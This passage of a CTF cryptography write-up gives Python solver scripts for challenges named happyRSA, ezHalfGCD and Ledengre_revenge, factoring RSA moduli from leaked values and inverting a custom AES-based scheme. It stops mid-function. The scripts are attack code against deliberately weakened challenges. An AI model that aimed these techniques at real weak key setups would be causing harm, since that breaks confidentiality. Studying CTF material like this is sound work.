    <span class="hljs-number">88338919773540412238116717043122711811</span>, <span class="hljs-number">113265824169274322024623493892867211478</span>, <span class="hljs-number">5549372099744960679418616304893848801</span>,
    <span class="hljs-number">12431828907518852062050349123660880165</span>, <span class="hljs-number">183957934738536914983862053251433028750</span>, <span class="hljs-number">42027289270308356303682029801998790750</span>,
    <span class="hljs-number">117406080036483925915502666019795783905</span>, <span class="hljs-number">154312255292300186042636734144948304054</span>, <span class="hljs-number">143706917273862261295046346995206133170</span>,
    <span class="hljs-number">50088136095338601440516112338120787526</span>, <span class="hljs-number">250634504150859449051246497912830488025</span>, <span class="hljs-number">8073010289877796888705519374892639903</span>,
    <span class="hljs-number">40049582814576788803483039836229025416</span>, <span class="hljs-number">227012342545923833983403067401561291645</span>, <span class="hljs-number">201776603581414625783054400184026088994</span>,
    <span class="hljs-number">55474945478884522762318445841998187357</span>, <span class="hljs-number">221515530211550293408010846844218019597</span>, <span class="hljs-number">172650752042211610909190315288155597255</span>,
    <span class="hljs-number">67046194931321172530462444254204111483</span>, <span class="hljs-number">207435868835185636819659137800256834557</span>, <span class="hljs-number">188063222224545200294767050268070647452</span>,
    <span class="hljs-number">58099349021260301211275261896736590564</span>, <span class="hljs-number">23598877596106927870697531042828774738</span>, <span class="hljs-number">58546308516383335224739442370238545000</span>,
    <span class="hljs-number">58125311541947998710088435169901475101</span>, <span class="hljs-number">238219925698115060748249043752036454438</span>, <span class="hljs-number">203910234934340893915761800653823457631</span>,
    <span class="hljs-number">190854889967769152565565000250829375099</span>, <span class="hljs-number">37573623890629846209257307181880876288</span>, <span class="hljs-number">226220240200270623843038279593586687278</span>,
    <span class="hljs-number">144246075981535671790438155977352345487</span>, <span class="hljs-number">14665770553338784222331493932533448756</span>, <span class="hljs-number">37992062606775322664977502677838074649</span>,
    <span class="hljs-number">47370175759976523832233910009306151684</span>, <span class="hljs-number">97047813247943880266351445874642842468</span>, <span class="hljs-number">237607444658797800072728280983357541134</span>,
    <span class="hljs-number">174853113478993738890584814806707459112</span>, <span class="hljs-number">17104608155861584438824639050715857607</span>, <span class="hljs-number">83639027011494777283064583268678718843</span>,
    <span class="hljs-number">237826165608708003941944469905843354705</span>, <span class="hljs-number">231707683915242052796886276983724691027</span>, <span class="hljs-number">146089830852925550139294146760718642221</span>,
    <span class="hljs-number">25604562707667550478623425477029052785</span>, <span class="hljs-number">108577663147976992047614498924706939204</span>, <span class="hljs-number">69040319834829375335287614995435269276</span>,
    <span class="hljs-number">169933229202934375632745753379104389929</span>, <span class="hljs-number">72693008284867494808267387710985847974</span>, <span class="hljs-number">158548279589965576940349068403862889270</span>,
    <span class="hljs-number">49458101234256610254825879149914255140</span>, <span class="hljs-number">24389558269688411084589654047215902968</span>, <span class="hljs-number">210567980379246548727819953025607019254</span>,
    <span class="hljs-number">110423375132252997825868399832298953831</span>, <span class="hljs-number">109589895677661968369424757992411668628</span>, <span class="hljs-number">66177577069199763925999718357846633613</span>,
    <span class="hljs-number">83602293803708828242273186265396676466</span>, <span class="hljs-number">172226271050176278536911356541786290551</span>, <span class="hljs-number">85799805809703976643034084477579915867</span>,
    <span class="hljs-number">179399990302447560847151603157937241688</span>, <span class="hljs-number">81687654752229170984692833277072534294</span>, <span class="hljs-number">160766441640281044008645821822296569868</span>,
    <span class="hljs-number">100306680611749750243920501921769642984</span>, <span class="hljs-number">42195187332833922597871030332905266026</span>, <span class="hljs-number">238918420772178508359295233180536910768</span>,
    <span class="hljs-number">221685929158944699801776621298532178665</span>, <span class="hljs-number">209349638787804999657456057184702655805</span>, <span class="hljs-number">183953393268431043006359511952782903516</span>,
    <span class="hljs-number">137364333131365794683132159746962959967</span>, <span class="hljs-number">15637689373906596015395350692459218048</span>, <span class="hljs-number">145956368418289159411911667337899986262</span>,
    <span class="hljs-number">197987711355277581048877821432652325207</span>, <span class="hljs-number">125421308989313724733467092345532539875</span>, <span class="hljs-number">90525081516582408488547894471421476595</span>,
    <span class="hljs-number">107405840115256692042814887586009104950</span>, <span class="hljs-number">71587500700172519801649824611045199280</span>, <span class="hljs-number">10155721246869986043302768283257682883</span>,
    <span class="hljs-number">100522792569358427133597834727509523742</span>, <span class="hljs-number">244473925018526409824670892423775482110</span>, <span class="hljs-number">50746138425761666610345252577572889037</span>,
    <span class="hljs-number">142188269919422432629363225167297071042</span>, <span class="hljs-number">8235113926890598897465093754260801947</span>, <span class="hljs-number">174540885017405784646782293055852044631</span>,
    <span class="hljs-number">171949847901434672429841435895697323702</span>, <span class="hljs-number">34391199559497599434575002007581170988</span>, <span class="hljs-number">7337868660819385932166025474594964373</span>,
    <span class="hljs-number">89608475952042154068811282935241824949</span>, <span class="hljs-number">162561097613906905390170334328135062933</span>, <span class="hljs-number">252566077272083954707900007055640560669</span>,
    <span class="hljs-number">4284637988579219107997224848114896904</span>, <span class="hljs-number">220026371387782427901244689037957398829</span>, <span class="hljs-number">86019060485320999498155965142619258089</span>,
    <span class="hljs-number">19304861731281576405798605142335886482</span>, <span class="hljs-number">123188238667151068575810494833929221938</span>, <span class="hljs-number">125089740978532716086813732154638565196</span>,
    <span class="hljs-number">252061524500088702951562270741214799294</span>, <span class="hljs-number">89528875472312768404823823905699760649</span>, <span class="hljs-number">63307407053590054220492282094909190524</span>,
    <span class="hljs-number">24389558269688411084589654047215902968</span>, <span class="hljs-number">43835777110183833958990705735152973942</span>, <span class="hljs-number">196543204310466258426232803779025620993</span>,
    <span class="hljs-number">225032412767857179129234169288824097261</span>, <span class="hljs-number">50292890880286260984317361296226049436</span>, <span class="hljs-number">64928956886509273090981701066528078331</span>,
    <span class="hljs-number">25408225921774957745573142542576755590</span>, <span class="hljs-number">235921667882292842303120860570747218086</span>, <span class="hljs-number">217132603855089441017750752624514343437</span>,
    <span class="hljs-number">11106129204256119599329380588789107048</span>, <span class="hljs-number">147501327490657927610543345089238991876</span>, <span class="hljs-number">158091159632919983870444592039392730373</span>,
    <span class="hljs-number">254215886971254771885657857148535673338</span>, <span class="hljs-number">129869106474614345624950211566868568809</span>, <span class="hljs-number">10425702332274469498479699675668087022</span>,
    <span class="hljs-number">136595953187315682777976356839442311764</span>, <span class="hljs-number">1607792140397737044118662059498732982</span>, <span class="hljs-number">23710000155612873207506044342091514799</span>,
    <span class="hljs-number">118571340370877720354330132780832828911</span>, <span class="hljs-number">194624784476702188629452374731837038856</span>, <span class="hljs-number">51332273108989067644245919615090753756</span>,
    <span class="hljs-number">24092104340528851160365826273938845156</span>, <span class="hljs-number">158670188709175825212687487436006138030</span>, <span class="hljs-number">133641825913283256858340618209700716053</span>,
    <span class="hljs-number">43054466484232130048301271684438593412</span>, <span class="hljs-number">20361972967806283315536154125012604660</span>, <span class="hljs-number">135700832615866572032111395529532615300</span>,
    <span class="hljs-number">160609169788639387827865051539103507016</span>, <span class="hljs-number">100576279475451993660766480883708996211</span>, <span class="hljs-number">215424685541583305069271024253690375127</span>,
    <span class="hljs-number">60018956375784961551937423504137141702</span>, <span class="hljs-number">107997941230633604720421526632224279451</span>, <span class="hljs-number">219482010609171816035007605036664317041</span>,
    <span class="hljs-number">22173526221024380740269311947729076493</span>, <span class="hljs-number">249746554302052221287371350978970766087</span>, <span class="hljs-number">93207359085331319264650563354951254906</span>,
    <span class="hljs-number">221421697282310997113867048083058096452</span>, <span class="hljs-number">61834092635779365101011109381392037516</span>, <span class="hljs-number">162215218701897689647766394615098617152</span>,
    <span class="hljs-number">141856131587452385513407955541400099703</span>, <span class="hljs-number">177910903795887762773545874929605680469</span>, <span class="hljs-number">228832704523723308335513552177377803295</span>,
    <span class="hljs-number">229427981969125094398744034150988525118</span>, <span class="hljs-number">217938760689082034514008764751385239765</span>, <span class="hljs-number">3238055163645731541423094980789895030</span>,
    <span class="hljs-number">42308449860804765793467328093112118974</span>, <span class="hljs-number">254764518926620089428032312378507653680</span>, <span class="hljs-number">215733901156118606036318409454786603209</span>,
    <span class="hljs-number">59640829345183339336712595595022506261</span>, <span class="hljs-number">33515071724475649656070325837411550208</span>, <span class="hljs-number">51175659069843551646353202764296812462</span>,
    <span class="hljs-number">211462959696081863041546889096760952490</span>, <span class="hljs-number">230559603938699838189391087728971115767</span>, <span class="hljs-number">85878911733601049548471257838175175563</span>,
    <span class="hljs-number">214134904074265214033878852207103328297</span>, <span class="hljs-number">160702405980652445507529591230654474171</span>, <span class="hljs-number">223755040649990285320102091954198427148</span>,
    <span class="hljs-number">166476753890268002826149533120107157745</span>, <span class="hljs-number">26283916639129998224675164834425763384</span>, <span class="hljs-number">232971495542024495583092055361321729894</span>,
    <span class="hljs-number">79741799146769724681649849525636816379</span>, <span class="hljs-number">228506526471280046809909301748098760369</span>, <span class="hljs-number">167502422063741368765891061653686283332</span>,
    <span class="hljs-number">26984184590668253713951516794937308166</span>, <span class="hljs-number">105952393031190074432183821281493254</span>, <span class="hljs-number">113823192955281698937767041115166174652</span>,
    <span class="hljs-number">93264047694114869263275726820602569731</span>, <span class="hljs-number">55481974783112950660682138071588408040</span>, <span class="hljs-number">108961894273530837550182447112767144669</span>,
    <span class="hljs-number">47975793549419083945738147934068241928</span>, <span class="hljs-number">204024371586357035343484206754422857590</span>, <span class="hljs-number">251859351272989525849999231358507018068</span>,
    <span class="hljs-number">75939709807860493804628805619699991501</span>, <span class="hljs-number">129031774446142139804436921156668129187</span>, <span class="hljs-number">110764318451937254261883856778359218969</span>,
    <span class="hljs-number">246404864722813298477426808193494673610</span>, <span class="hljs-number">153818236564405157581869620439634140065</span>, <span class="hljs-number">246125932167584353084676586883038397451</span>
]


exponent = (p - <span class="hljs-number">1</span>) // <span class="hljs-number">2</span>
symbol_for_zero = <span class="hljs-built_in">pow</span>(a, exponent, p)
binary_flag = <span class="hljs-string">&quot;&quot;</span>
<span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> ciphertext:
    current_symbol = <span class="hljs-built_in">pow</span>(c, exponent, p)
    <span class="hljs-keyword">if</span> current_symbol == symbol_for_zero:
        binary_flag += <span class="hljs-string">&#x27;0&#x27;</span>
    <span class="hljs-keyword">else</span>:
        binary_flag += <span class="hljs-string">&#x27;1&#x27;</span>

flag_bytes = <span class="hljs-string">b&#x27;&#x27;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(binary_flag), <span class="hljs-number">8</span>):
    byte_str = binary_flag[i:i+<span class="hljs-number">8</span>]
    flag_bytes += long_to_bytes(<span class="hljs-built_in">int</span>(byte_str, <span class="hljs-number">2</span>))

<span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Flag: <span class="hljs-subst">{flag_bytes.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)}</span>&quot;</span>)
</code></pre></div>
<h3 class="md-h md-h3" id="happyrsa"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">happyRSA</span></h3>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">python</span><span class="md-code-meta">40 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes
<span class="hljs-keyword">import</span> gmpy2


n = <span class="hljs-number">128523866891628647198256249821889078729612915602126813095353326058434117743331117354307769466834709121615383318360553158180793808091715290853250784591576293353438657705902690576369228616974691526529115840225288717188674903706286837772359866451871219784305209267680502055721789166823585304852101129034033822731</span>
e = <span class="hljs-number">65537</span>
c = <span class="hljs-number">125986017030189249606833383146319528808010980928552142070952791820726011301355101112751401734059277025967527782109331573869703458333443026446504541008332002497683482554529670817491746530944661661838872530737844860894779846008432862757182462997411607513582892540745324152395112372620247143278397038318619295886</span>
x = <span class="hljs-number">522964948416919148730075013940176144502085141572251634384238148239059418865743755566045480035498265634350869368780682933647857349700575757065055513839460630399915983325017019073643523849095374946914449481491243177810902947558024707988938268598599450358141276922628627391081922608389234345668009502520912713141</span>


<span class="hljs-comment"># n_phi^2 + n_phi + (1 - x) = 0</span>
delta1 = <span class="hljs-number">4</span> * x - <span class="hljs-number">3</span>
n_phi = (gmpy2.isqrt(delta1) - <span class="hljs-number">1</span>) // <span class="hljs-number">2</span>

<span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n_phi: <span class="hljs-subst">{n_phi}</span>&quot;</span>)


<span class="hljs-comment"># S = p + q = n_phi + 1</span>
S = n_phi + <span class="hljs-number">1</span>
<span class="hljs-comment"># p和q是方程 z^2-Sz+n=0 的根</span>
<span class="hljs-comment"># z = (S+/-sqrt(S^2-4n))/2</span>
delta2 = S*S - <span class="hljs-number">4</span>*n
sqrt_delta2 = gmpy2.isqrt(delta2)

p = (S + sqrt_delta2) // <span class="hljs-number">2</span>
q = (S - sqrt_delta2) // <span class="hljs-number">2</span>

<span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;p: <span class="hljs-subst">{p}</span>&quot;</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;q: <span class="hljs-subst">{q}</span>&quot;</span>)
<span class="hljs-keyword">assert</span> n == p * q



phi_n = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)
d = <span class="hljs-built_in">pow</span>(e, -<span class="hljs-number">1</span>, phi_n)
m = <span class="hljs-built_in">pow</span>(c, d, n)
flag = long_to_bytes(m)

<span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Flag: <span class="hljs-subst">{flag.decode()}</span>&quot;</span>)
</code></pre></div>
<h3 class="md-h md-h3" id="ezhalfgcd"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">ezHalfGCD</span></h3>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">python</span><span class="md-code-meta">127 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-python"><span class="hljs-keyword">import</span> gmpy2
<span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes
<span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> comb

e = <span class="hljs-number">11</span>
n = <span class="hljs-number">31166099657280475125475535365831782783093875463247358362475188588947278779261659087382153841735341294644470135658242563894811427195085499234687959821014213884097144683916979145688501653937652132196507641706592058541461494851978378234097501450088696202067780458185699118745693112795064523774316076900622924515043087514299819363383005261432426124907190050031873969718731577577610423430342011833399812571330259167141343053584093492407110726050289284883569075898031613703838488237576756303655189545592872431914967027530453720947545137077577544615857606624432667091058064432254815560483584621525418467954592836937243988243</span>
enc_d = <span class="hljs-number">13808910452602719582082356538103809869422886228259509560372242093772427733416618401205696740074353028623820317050192627491660359558892392153999532272857339481298482802886251848703046960504786528793589170539584003383632027476914361574273144291330585735179166690513545471901763697269194228467287645573188775899890375853801796593582850975578804671547453457528686518397397234277841944184055117669277697362945463508844599947716337314398521363079749738943908860398843430518505690528296941997988869732759053587554475692300841912141199296010163641185664377742397777941968394746150611710777000625916609542525700860321528867212</span>
enc_phi = <span class="hljs-number">7712799451523923934297438340493818709638100911475880659269081521797448094000671886662453371669377561442768781648787281763679814952312810588749220640616349121013802986627369725105748412428708271146640375251603852154891826036699121824706508396445679193881511426962350499448921650925902083009038656420224517990418144263810608916613943703387804258988710100695100014625921151006914635066745373266932452264209581055597451243351753611834270245107587926127995770837997657200564139159783438755362906511732933456755615781562673235575025697927723044975521898510169824612319133648292886516647301360818651593931313229819219102145</span>
enc_flag = <span class="hljs-number">894510730103475572849584456948777906177928458037601077973815297094718207962800841050676989919558783959100151883021776468599378605624814726543232609670826195546342526501910728018180564277901156145145431115589678554941920392777979439329210254339330200637295639957614541733453280727879958971862238162005775966684182859139832583501267115086918765938983728386252082360729694525611252282765144977858082339098241367689924035089953114271269967974794791094625994785638389602317004891381734713155429498571328372671258967340771255624802290579938944569672935599910907961053536945947262426210286500553262856689698523083914877686</span>



<span class="hljs-keyword">def</span> <span class="hljs-title function_">poly_trim</span>(<span class="hljs-params">p</span>):
    <span class="hljs-keyword">while</span> p <span class="hljs-keyword">and</span> p[-<span class="hljs-number">1</span>] == <span class="hljs-number">0</span>:
        p.pop()
    <span class="hljs-keyword">return</span> p

<span class="hljs-keyword">def</span> <span class="hljs-title function_">poly_mul</span>(<span class="hljs-params">p1, p2, mod</span>):
    deg1, deg2 = <span class="hljs-built_in">len</span>(p1) - <span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(p2) - <span class="hljs-number">1</span>
    new_poly = [<span class="hljs-number">0</span>] * (deg1 + deg2 + <span class="hljs-number">1</span>)
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(deg1 + <span class="hljs-number">1</span>):
        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(deg2 + <span class="hljs-number">1</span>):
            new_poly[i + j] = (new_poly[i + j] + p1[i] * p2[j]) % mod
    <span class="hljs-keyword">return</span> poly_trim(new_poly)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">poly_divmod</span>(<span class="hljs-params">a, b, mod</span>):
    a, b = <span class="hljs-built_in">list</span>(a), <span class="hljs-built_in">list</span>(b)
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> b:
        <span class="hljs-keyword">raise</span> ZeroDivisionError
    deg_a, deg_b = <span class="hljs-built_in">len</span>(a) - <span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(b) - <span class="hljs-number">1</span>
    <span class="hljs-keyword">if</span> deg_a &lt; deg_b:
        <span class="hljs-keyword">return</span> [<span class="hljs-number">0</span>], a
    
    q = [<span class="hljs-number">0</span>] * (deg_a - deg_b + <span class="hljs-number">1</span>)
    lead_b = b[-<span class="hljs-number">1</span>]
    <span class="hljs-keyword">try</span>:
        inv_lead_b = gmpy2.invert(lead_b, mod)
    <span class="hljs-keyword">except</span> ZeroDivisionError:
        factor = gmpy2.gcd(lead_b, mod)
        <span class="hljs-keyword">return</span> (factor, <span class="hljs-literal">None</span>)

    <span class="hljs-keyword">while</span> deg_a &gt;= deg_b:
        lead_a = a[-<span class="hljs-number">1</span>]

        coeff = (lead_a * inv_lead_b) % mod
        deg_diff = deg_a - deg_b
        q[deg_diff] = coeff

        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(deg_b + <span class="hljs-number">1</span>):
            a[deg_diff + i] = (a[deg_diff + i] - coeff * b[i]) % mod
            
        a = poly_trim(a)
        deg_a = <span class="hljs-built_in">len</span>(a) - <span class="hljs-number">1</span>
        
    <span class="hljs-keyword">return</span> poly_trim(q), a

<span class="hljs-keyword">def</span> <span class="hljs-title function_">poly_gcd</span>(<span class="hljs-params">a, b, mod</span>):

    <span class="hljs-keyword">while</span> b:
        res, rem = poly_divmod(a, b, mod)
        <span class="hljs-keyword">if</span> rem <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            <span class="hljs-keyword">return</span> res
        a, b = b, rem
    <span class="hljs-keyword">return</span> a

<span class="hljs-comment"># 构造多项式 P1(x) = x^e - enc_d</span>

P1 = [-enc_d % n] + [<span class="hljs-number">0</span>] * (e - <span class="hljs-number">1</span>) + [<span class="hljs-number">1</span>]

flag_found = <span class="hljs-literal">False</span>
<span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, e):
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;k = <span class="hljs-subst">{k}</span>&quot;</span>)
    
    <span class="hljs-comment"># 构造多项式 P2(x) = (e*x - 1)^e - enc_phi * k^e</span>
    <span class="hljs-comment"># 使用二项式定理展开 (e*x - 1)^e</span>
    <span class="hljs-comment"># (a+b)^n = sum(C(n,k) * a^k * b^(n-k))</span>
    <span class="hljs-comment"># a = e*x, b = -1</span>
    P2 = [<span class="hljs-number">0</span>] * (e + <span class="hljs-number">1</span>)
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(e + <span class="hljs-number">1</span>):
        <span class="hljs-comment"># x^i 项的系数是 C(e, i) * (e^i) * (-1)^(e-i)</span>
        coeff = (comb(e, i) * <span class="hljs-built_in">pow</span>(e, i, n) * <span class="hljs-built_in">pow</span>(-<span class="hljs-number">1</span>, e-i, n)) % n
        P2[i] = coeff
    
    <span class="hljs-comment"># P2(x) = P2(x) - enc_phi * k^e</span>
    P2[<span class="hljs-number">0</span>] = (P2[<span class="hljs-number">0</span>] - (enc_phi * <span class="hljs-built_in">pow</span>(k, e, n)) % n) % n

    <span class="hljs-comment"># 计算 GCD，看是否能找到 n 的因子</span>
    result = poly_gcd(<span class="hljs-built_in">list</span>(P1), <span class="hljs-built_in">list</span>(P2), n)

    <span class="hljs-comment"># 检查结果。如果它是一个整数，那就是 n 的因子</span>
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(result, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">or</span> <span class="hljs-built_in">isinstance</span>(result, gmpy2.mpz):
        p = result
        <span class="hljs-keyword">if</span> <span class="hljs-number">1</span> &lt; p &lt; n:
            q = n // p
            <span class="hljs-keyword">if</span> p * q == n:
                phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)
                d = gmpy2.invert(e, phi)
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;d: <span class="hljs-subst">{d}</span>&quot;</span>)
                
                m = <span class="hljs-built_in">pow</span>(enc_flag, d, n)
                flag = long_to_bytes(m)
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Flag: <span class="hljs-subst">{flag.decode()}</span>&quot;</span>)
                flag_found = <span class="hljs-literal">True</span>
                <span class="hljs-keyword">break</span>
            <span class="hljs-keyword">else</span>:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;error&quot;</span>)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-comment"># 如果 GCD 是一次多项式 a*x + b，根是 -b/a</span>
        g = poly_trim(result)
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(g) == <span class="hljs-number">2</span>: <span class="hljs-comment"># 一次多项式</span>
            b0, a1 = g[<span class="hljs-number">0</span>], g[<span class="hljs-number">1</span>]
            <span class="hljs-keyword">try</span>:
                inv_a1 = gmpy2.invert(a1, n)
                d = (-b0 * inv_a1) % n
                <span class="hljs-keyword">if</span> <span class="hljs-built_in">pow</span>(d, e, n) == enc_d:
                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;d: <span class="hljs-subst">{d}</span>&quot;</span>)
                    m = <span class="hljs-built_in">pow</span>(enc_flag, d, n)
                    flag = long_to_bytes(m)
                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Flag: <span class="hljs-subst">{flag.decode()}</span>&quot;</span>)
                    flag_found = <span class="hljs-literal">True</span>
                    <span class="hljs-keyword">break</span>
            <span class="hljs-keyword">except</span> ZeroDivisionError:
                <span class="hljs-keyword">pass</span> <span class="hljs-comment"># 这个系数不可逆，说明我们又找到了一个因子</span>
                
<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> flag_found:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;error&quot;</span>)
</code></pre></div>
<h3 class="md-h md-h3" id="ledengre_revenge"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">Ledengre_revenge</span></h3>
<p>10轮加密，用了aes，可以写出逆，注意索引变换</p>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">python</span><span class="md-code-meta">147 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long, long_to_bytes
<span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES

p = <span class="hljs-number">251</span>
e = <span class="hljs-number">65537</span>
p_ = <span class="hljs-number">71583805456773770888820224577418671344500223401233301642692926000191389937709</span>
key_pow = <span class="hljs-number">1679283667939124174051653611794421444808492935736643969239278575726980681302</span>
text_sq = <span class="hljs-number">26588763961966808496088145486940545448967891102453278501457496293530671899568</span>
a = [[<span class="hljs-number">239</span>, <span class="hljs-number">239</span>, <span class="hljs-number">251</span>, <span class="hljs-number">239</span>], [<span class="hljs-number">233</span>, <span class="hljs-number">227</span>, <span class="hljs-number">233</span>, <span class="hljs-number">251</span>], [<span class="hljs-number">251</span>, <span class="hljs-number">239</span>, <span class="hljs-number">251</span>, <span class="hljs-number">233</span>], [<span class="hljs-number">233</span>, <span class="hljs-number">227</span>, <span class="hljs-number">251</span>, <span class="hljs-number">233</span>]]
lis0_given = [[<span class="hljs-number">341</span>, <span class="hljs-number">710</span>, <span class="hljs-number">523</span>, <span class="hljs-number">1016</span>], [<span class="hljs-number">636</span>, <span class="hljs-number">366</span>, <span class="hljs-number">441</span>, <span class="hljs-number">790</span>], [<span class="hljs-number">637</span>, <span class="hljs-number">347</span>, <span class="hljs-number">728</span>, <span class="hljs-number">426</span>], [<span class="hljs-number">150</span>, <span class="hljs-number">184</span>, <span class="hljs-number">421</span>, <span class="hljs-number">733</span>]]
lis1_given = [[<span class="hljs-number">133</span>, <span class="hljs-number">301</span>, <span class="hljs-number">251</span>, <span class="hljs-number">543</span>], [<span class="hljs-number">444</span>, <span class="hljs-number">996</span>, <span class="hljs-number">507</span>, <span class="hljs-number">1005</span>], [<span class="hljs-number">18</span>, <span class="hljs-number">902</span>, <span class="hljs-number">379</span>, <span class="hljs-number">878</span>], [<span class="hljs-number">235</span>, <span class="hljs-number">448</span>, <span class="hljs-number">836</span>, <span class="hljs-number">263</span>]]

<span class="hljs-keyword">def</span> <span class="hljs-title function_">function</span>(<span class="hljs-params">x, pp</span>):
    y = <span class="hljs-number">0</span>
    <span class="hljs-keyword">if</span> x &gt;= pp:
        y = x
    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">pow</span>(x, (pp - <span class="hljs-number">1</span>) // <span class="hljs-number">2</span>, pp) == <span class="hljs-number">1</span>:
        y = <span class="hljs-built_in">pow</span>(x, <span class="hljs-number">2</span>, pp)
    <span class="hljs-keyword">else</span>:
        y = <span class="hljs-built_in">pow</span>(x, <span class="hljs-number">3</span>, pp)
    <span class="hljs-keyword">return</span> y

<span class="hljs-comment">#预计算逆</span>
reverse_251 = [[] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>)]
<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):
    y = function(x, <span class="hljs-number">251</span>)
    <span class="hljs-keyword">if</span> y &lt; <span class="hljs-number">256</span>:  <span class="hljs-comment"># ensure</span>
        reverse_251[y].append(x)
unique_ps = {<span class="hljs-number">227</span>, <span class="hljs-number">233</span>, <span class="hljs-number">239</span>, <span class="hljs-number">251</span>}
reverse_a = {}
<span class="hljs-keyword">for</span> pa <span class="hljs-keyword">in</span> unique_ps:
    rev = [[] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>)]
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):
        y = function(x, pa)
        <span class="hljs-keyword">if</span> y &lt; <span class="hljs-number">256</span>:
            rev[y].append(x)
    reverse_a[pa] = rev

<span class="hljs-comment">#爆破key</span>
key = <span class="hljs-literal">None</span>
<span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">16</span>):
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">pow</span>(k, <span class="hljs-number">2</span> * e, p_) == key_pow:
        key = k
        <span class="hljs-keyword">break</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found key: <span class="hljs-subst">{key}</span> (binary: <span class="hljs-subst">{<span class="hljs-built_in">bin</span>(key)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">16</span>)}</span>)&quot;</span>)

<span class="hljs-comment">#AES key</span>
aes_key_bytes = long_to_bytes(key &lt;&lt; <span class="hljs-number">107</span>)
cipher = AES.new(aes_key_bytes, AES.MODE_ECB)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">tonelli_shanks</span>(<span class="hljs-params">n, pp</span>):
    <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>
    leg = <span class="hljs-built_in">pow</span>(n, (pp - <span class="hljs-number">1</span>) // <span class="hljs-number">2</span>, pp)
    <span class="hljs-keyword">if</span> leg != <span class="hljs-number">1</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
    q = pp - <span class="hljs-number">1</span>
    s = <span class="hljs-number">0</span>
    <span class="hljs-keyword">while</span> q % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:
        q //= <span class="hljs-number">2</span>
        s += <span class="hljs-number">1</span>
    z = <span class="hljs-number">2</span>
    <span class="hljs-keyword">while</span> <span class="hljs-built_in">pow</span>(z, (pp - <span class="hljs-number">1</span>) // <span class="hljs-number">2</span>, pp) != pp - <span class="hljs-number">1</span>:
        z += <span class="hljs-number">1</span>
    m = s
    c = <span class="hljs-built_in">pow</span>(z, q, pp)
    t = <span class="hljs-built_in">pow</span>(n, q, pp)
    r = <span class="hljs-built_in">pow</span>(n, (q + <span class="hljs-number">1</span>) // <span class="hljs-number">2</span>, pp)
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
